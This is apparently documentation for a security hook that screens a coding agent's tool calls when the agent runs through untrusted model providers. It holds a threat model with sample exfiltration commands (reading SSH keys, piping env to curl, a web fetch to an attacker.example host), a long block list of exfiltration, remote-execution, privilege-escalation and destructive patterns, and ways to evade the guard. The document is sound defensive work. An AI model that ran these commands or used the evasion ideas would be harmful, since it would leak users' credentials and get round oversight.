# Claude Code security hooks

Free Claude Code ships a **default-on** `PreToolUse` security guard for its
Claude Code launchers. Every `fcc-claude` session, and every managed
(messaging / `fcc-desktop`) Claude Code task, launches with the guard already
registered. You do not have to enable anything.

The guard is a packaged Python console script (`fcc-hook-guard`, from
`src/free_claude_code/security/`) so it survives `uv tool install` and is on
`PATH` next to `fcc-claude`. The launchers register it by appending
`--settings '<json>'` to the `claude` invocation; that JSON **merges** with your
existing `~/.claude` configuration (permissions, other hooks, MCP servers) and
never replaces it.

## Threat model

Free Claude Code routes your coding agent's model traffic through whichever
provider you configure — including free/low-cost third-party providers whose
weights, prompts, and output you do not control. That provider is an
**untrusted upstream**: anything it returns can be interpreted by the coding
agent as instructions, including tool calls.

This matters most for the **managed agent path**
(`src/free_claude_code/cli/managed/claude.py`), which launches Claude Code with
`--dangerously-skip-permissions` so it can run unattended from a messaging
integration (Telegram/Discord) and from `fcc-desktop`. That flag skips the
*interactive* permission prompts — it does **not** disable hooks. A provider
that returns a subtly malicious tool call (for example "helpfully" running
`cat ~/.ssh/id_rsa` to "check SSH config," or `env | curl … -d @-` to "report
diagnostics") would otherwise sail straight through, because nothing asks a
human to approve it first.

The guard is a second, independent check that fires **regardless of permission
mode** — interactive or `--dangerously-skip-permissions` alike. It runs before
every matched tool call and can veto it.

## How it works (the contract)

Claude Code writes one JSON object to the guard's stdin per matched tool call,
e.g. `{"tool_name": "Bash", "tool_input": {"command": "curl https://x"}}`. The
guard replies on the documented Claude Code 2.1.x `PreToolUse` contract:

- **Allow** → exit 0 with no stdout ("no opinion"; the normal permission flow
  proceeds).
- **Deny** → exit 0 with a JSON object on stdout:

  ```json
  {"hookSpecificOutput": {"hookEventName": "PreToolUse",
                          "permissionDecision": "deny",
                          "permissionDecisionReason": "fcc-hook-guard: …"}}
  ```

  Claude Code feeds `permissionDecisionReason` back to the model, so the deny
  both stops the call and tells the agent *why* (and what to do instead).

The registered matcher is
`Bash|Read|Edit|Write|MultiEdit|NotebookEdit|WebFetch|WebSearch|Grep|Glob`.

## Design philosophy

The guard denies **only high-signal dangerous operations** and is deliberately
tuned to leave ordinary development work alone. It blocks the patterns a
compromised provider would use to steal secrets or exfiltrate data; it does not
try to sandbox the agent or approve/deny everything. Concretely, these all stay
allowed: `git commit`, `git push origin main` (and force-push to a *named*
remote), `git reset --hard`, `pytest`, `npm test`/`npm install <pkg>`,
`pip install <pkg>`, `rm -rf node_modules`, `chmod +x`, `curl http://127.0.0.1…`
(the local proxy), `ssh-keygen`, local `rsync`, reading/editing project source,
and reading `.env.example` / `.env.sample` templates.

## What it blocks

Grouped by category (see `src/free_claude_code/security/hook_guard.py` for the
exact rules — each rule carries a plain-English reason):

1. **Secret file access — read OR write** (all matched tools). Credential
   directories (`~/.ssh`, `~/.aws`, `~/.config/gcloud`, `~/.kube`, `~/.docker`,
   `~/.azure`, `~/.gnupg`, `~/.config/gh`); `.env` / `.env.*` secret files
   (templates like `.env.example` are allowed); `*.pem` / `*.key` / `*.p12`
   private keys; `id_rsa*` / `id_ed25519*`; `~/.netrc`, `~/.npmrc`, `~/.pypirc`,
   `~/.git-credentials`; FCC's own `~/.fcc/proxy_auth_token` and `~/.fcc/.env`;
   macOS Keychains (`~/Library/Keychains`, `security dump-keychain`); browser
   cookie / saved-login databases; `/etc/shadow`; shell/REPL history
   (`~/.zsh_history`, `~/.bash_history`, …); SSH `authorized_keys`.
2. **Exfiltration (Bash).** `curl`/`wget`/`nc`/`ncat`/`scp`/`sftp`/`ssh`/
   `telnet`/`socat`, and `rsync` to a remote spec, against a **non-loopback**
   host; piping `env`/`printenv` or `base64` into a network tool; `/dev/tcp/`
   socket redirects; DNS exfiltration (a long encoded label in `dig`/`nslookup`/
   `host`); `sendmail`/`mailx`/`mail -s`; inline `python`/`node`/`ruby`/`perl`
   one-liners that open a socket to a non-loopback host; `git push` to an
   ad-hoc URL remote.
3. **Remote code execution.** `curl … | sh` / `| bash` (and other
   pipe-to-interpreter forms), `bash <(curl …)`, `$(curl …)`, `pip`/`pipx`/
   `uv pip install` from a URL/VCS spec, `npm`/`pnpm`/`yarn install` of a
   git/URL spec, `npx` against a URL/GitHub spec.
4. **Privilege escalation / persistence / system tampering.** `sudo`/`doas`;
   disabling SIP / Gatekeeper / firewall (`csrutil disable`,
   `spctl --master-disable`, `pfctl -d`, `ufw disable`, …); editing
   `/etc/sudoers` or PAM; launchd persistence (`launchctl load`,
   `~/Library/LaunchAgents`); cron/at persistence; writing to shell startup
   files (`~/.zshrc`, `~/.bashrc`, …); `chmod 777`; appending SSH keys
   (`ssh-copy-id`, `>> authorized_keys`).
5. **Destructive.** `rm -rf /` / `~` / `$HOME` / `/*`; fork bombs; `dd` to a
   raw disk device; `mkfs`/`newfs`/`wipefs`/`shred`/`diskutil erase`.
6. **Cloud-metadata SSRF (WebFetch + Bash).** `169.254.169.254`,
   `metadata.google.internal`, `fd00:ec2::254`, `169.254.170.2`,
   `100.100.100.200`.
7. **Non-loopback `WebFetch`/`WebSearch` (default-deny).** Any `WebFetch`
   whose URL host is not loopback (`127.0.0.1`, `localhost`, `::1`, …) is
   denied by default, and `WebSearch` — which has no caller-specified host at
   all — is denied outright. This is the primary defense against
   `web_fetch GET attacker.example.com/?leak=<data>` style exfiltration on a
   bare-host run. It is configurable: set `FCC_WEBFETCH_ALLOW_HOSTS` to a
   comma-separated list of allowed hostnames/suffixes (e.g.
   `docs.python.org,example.com`), or `FCC_ALLOW_WEB_FETCH=1` to disable this
   one rule and restore unrestricted `WebFetch`/`WebSearch`. See
   [Using untrusted cloud providers safely](#using-untrusted-cloud-providers-safely)
   below.

`WebFetch`/`WebSearch` also still trip the secret-file and metadata-SSRF rules
above when the URL/query names a secret path or a metadata endpoint — those
checks run first and give a more specific deny reason.

## Opting out

Set `FCC_DISABLE_SECURITY_HOOKS=1` in the launcher's environment to omit the
`--settings` guard registration entirely. Any other value (or unset) keeps it
on. Use this if a rule blocks something you legitimately need and you accept the
risk.

Known deliberate false-blocks (the cost of the "block by default" posture):

- **`curl`/`wget` to a non-loopback host is denied.** Use the local proxy
  (`127.0.0.1`) for legitimate fetches, or allowlist a host for `WebFetch`
  (below) — the primary exfiltration channel is blocked even though it also
  stops manual remote `curl`.
- **`WebFetch`/`WebSearch` to a non-loopback host is denied.** Set
  `FCC_WEBFETCH_ALLOW_HOSTS=host1,host2` to allowlist specific hosts, or
  `FCC_ALLOW_WEB_FETCH=1` to disable this rule entirely.
- **`sudo`/`doas` is denied.** The agent should not need root; run privileged
  steps yourself.
- **Reading `.env` (non-template), `*.pem`, and `*.key` is denied**, even for
  your own project's files. Use `.env.example` or ask for the specific value.

## Trust model

Hooks provided via `claude --settings` at startup run automatically; Claude Code
does **not** show a review/acknowledgement dialog for them, and the managed path
runs with `--dangerously-skip-permissions` anyway. So a normal `fcc-claude` run
picks up the guard silently, with no extra prompt. (Claude Code's separate
workspace-*folder* trust dialog is unrelated to this and unaffected. If an
administrator has set the managed-policy `allowManagedHooksOnly`, `--settings`
hooks may be suppressed — an uncommon configuration.)

## Standalone shell variant (legacy / non-FCC setups)

`hooks/fcc-guard.sh` + `hooks/settings.json` are the original standalone POSIX
`sh` prototype. The packaged `fcc-hook-guard` **supersedes** it for FCC
launchers and covers many more categories. The shell script is kept for setups
where the Python package is not installed — e.g. wiring a guard into a global
`CLAUDE_CONFIG_DIR` or a container image by hand. It implements only categories
(1) and part of (2). To wire it in manually, merge the `hooks` object from
`hooks/settings.json` into the relevant `.claude/settings.json`, pointing
`command` at an absolute path to `hooks/fcc-guard.sh`.

## Limits — be precise about what this buys you

- **It is a heuristic regex filter over tool-call JSON, not a shell parser, a
  taint tracker, or a sandbox.** It does not understand shell quoting, variable
  expansion, command substitution, pipelines beyond the specific patterns above,
  or indirection through a wrapper script. A motivated adversarial provider can
  very likely construct a command that exfiltrates data without matching any
  rule — writing a host into a variable first, using an interpreter or binary
  not on the list, obfuscating a path, or splitting a sensitive read across two
  separate approved tool calls that only recombine in the model's own context.
- **The non-loopback check is intentionally blunt.** A command that mentions
  *both* a loopback address and a remote one is allowed, because the check is
  "mentions a loopback marker somewhere," not "every target is loopback."
- **It only sees Claude Code's own `PreToolUse` tools.** It has no visibility
  into MCP tool calls, a sub-agent's tool use, or anything outside the matched
  tool set.
- **It fails open.** On any internal parse error it allows the call, so a guard
  bug cannot brick every tool call. That means it is not a hard boundary.
- **It is not the security boundary.** Two stronger layers do the real work:
  (a) the launcher environment builders (`cli/claude_env.py`) already **strip
  every provider credential** (`GROQ_API_KEY`, `NVIDIA_NIM_API_KEY`, …) before
  spawning the agent, so those secrets are not in the child process for a
  compromised tool call to read back out; and (b) the project's containerized,
  egress-filtered deployment (see the main
  [`README.md`](../README.md#containerized-isolated-runtime) — non-root,
  read-only rootfs, `internal: true` network, Squid egress allowlist) is the
  real backstop. This guard is a best-effort third layer against secrets that
  legitimately live on disk (SSH keys, cloud credentials, browser cookies) and
  against the most common exfiltration and secret-access patterns — not a
  guarantee that unauthorized access is prevented.

To exercise the guard the way Claude Code would:

```bash
printf '%s' '{"tool_name":"Bash","tool_input":{"command":"cat ~/.ssh/id_rsa"}}' \
  | fcc-hook-guard; echo "exit=$?"
```

## Using untrusted cloud providers safely

Free Claude Code exists to let you point a coding agent at free/low-cost
third-party providers. Those providers are, by this project's own threat
model (above), **untrusted upstreams**: they see your prompts and tool
output, and a malicious or compromised one can try to steer the agent into
leaking data. There is no single switch that makes this "safe" — it is a
stack of independent layers, each catching what the one below it misses.
From weakest to strongest:

1. **Credential-stripping (always on).** The launcher environment builders
   (`cli/claude_env.py`) strip every provider API key (`GROQ_API_KEY`,
   `NVIDIA_NIM_API_KEY`, …) before spawning the coding agent, so those
   secrets are simply not present in the agent's process environment for a
   malicious tool call to read back out. This protects *FCC's own* provider
   credentials; it does nothing for other secrets that happen to live on the
   machine (SSH keys, cloud CLI tokens, browser cookies, project `.env`
   files) or that you paste into the conversation yourself.
2. **Default-on `PreToolUse` hooks (`fcc-hook-guard`, this document).** A
   heuristic filter in front of every matched tool call, on by default for
   every `fcc-claude` and managed-agent launch. It blocks reading/writing
   well-known credential stores, the exfiltration/remote-code-exec/
   privilege-escalation/destructive Bash patterns above, cloud-metadata SSRF,
   and — as of this rule — `WebFetch`/`WebSearch` to any non-loopback host by
   default (`FCC_WEBFETCH_ALLOW_HOSTS` to allowlist, `FCC_ALLOW_WEB_FETCH=1`
   to disable). This directly closes the simplest exfiltration path a
   compromised provider has on a bare-host run: telling the agent to
   `web_fetch` a URL that embeds stolen data as a query parameter.
3. **Proxy-side outbound secret redaction.** `fcc-server` supports
   `OUTBOUND_SECRET_REDACTION` (default `redact`) to scan outbound request
   bodies for secret-shaped values before they leave the proxy and redact or
   block them. This is a second, independent check on the same channel the
   hook guard's `WebFetch` rule targets — it runs proxy-side, so it also
   covers exfiltration attempts that don't go through Claude Code's own
   tool-call hooks at all (e.g. from a sub-agent or an MCP tool the guard
   never sees).
4. **Containerized, egress-allowlisted deployment.** Running `fcc-server`
   via the [`Dockerfile`](../Dockerfile) / [`docker-compose.yml`](../docker-compose.yml)
   setup (see the main [`README.md`](../README.md#containerized-isolated-runtime))
   confines the proxy itself: non-root, read-only rootfs, `internal: true`
   network with no default internet route, and a Squid sidecar enforcing a
   deny-by-default hostname allowlist (see
   [Egress filtering](../README.md#egress-filtering)). This bounds what the
   *proxy* can reach; it does not by itself sandbox the coding agent process.
5. **The sandboxed-agent runner (`sandbox/`) — the strongest option.**
   Running the coding agent itself inside the sandbox, rather than directly
   on your host, is the layer that actually changes the trust equation:
   instead of relying on a filter to catch bad tool calls after the fact, the
   agent process has no access to your real filesystem, credentials, or
   network by default. Prefer this whenever the task or the provider doesn't
   need your real environment.

### A "paranoid" preset

If you're running an untrusted/free provider against anything you'd mind
leaking, combine:

- Run the coding agent inside the sandboxed runner (`sandbox/`) — or, at
  minimum, the containerized `fcc-server` deployment — rather than directly
  on your host.
- Leave proxy authentication on (the default) so nothing on your LAN can ride
  the proxy.
- Set `OUTBOUND_SECRET_REDACTION=redact` (or `block`, if you'd rather fail the
  request than risk a false negative in the pattern matcher).
- Leave the `WebFetch`/`WebSearch` lockdown at its default (loopback-only) —
  do **not** set `FCC_ALLOW_WEB_FETCH=1` or add hosts to
  `FCC_WEBFETCH_ALLOW_HOSTS` unless you specifically need one.
- Don't paste real secrets into the conversation. No layer here inspects or
  protects the model's *input* — only tool calls and outbound requests it
  triggers.

### Honest limits — read this before trusting any of it

- **The hooks are heuristic and bypassable, and they fail open.** They are
  regex filters over tool-call JSON, not a shell parser or a taint tracker
  (see [Limits](#limits--be-precise-about-what-this-buys-you) above). A
  sufficiently motivated adversarial provider can very likely construct a
  tool call that gets past them — an unlisted tool, an obfuscated host, data
  split across two approved calls that only recombine in the model's own
  context. A bug in the guard itself fails *open* (allows), by design, so it
  is not a hard boundary.
- **Redaction is pattern-based.** `OUTBOUND_SECRET_REDACTION` can only redact
  what it recognizes as secret-shaped. Data that doesn't match a known
  pattern — a customer record, source code, free-form prose containing a
  secret in an unexpected format — passes through untouched.
- **None of this stops a provider from seeing what you send it.** Every layer
  above operates on tool calls and outbound requests the agent *makes*; none
  of them inspect or filter the prompt/context you send to the model in the
  first place. If a conversation contains a secret, the provider sees it,
  full stop — no hook or redaction layer here runs on that path.
- **The only real guarantee is not sending the data.** Concretely: run the
  agent sandboxed, without your real credentials or sensitive files
  reachable, and don't put secrets in the conversation. Every layer above
  this is defense-in-depth for the case where that discipline slips — not a
  substitute for it. Do not treat this document as proof that using an
  untrusted provider is "safe" in an absolute sense; it describes what is
  mitigated, not what is guaranteed.
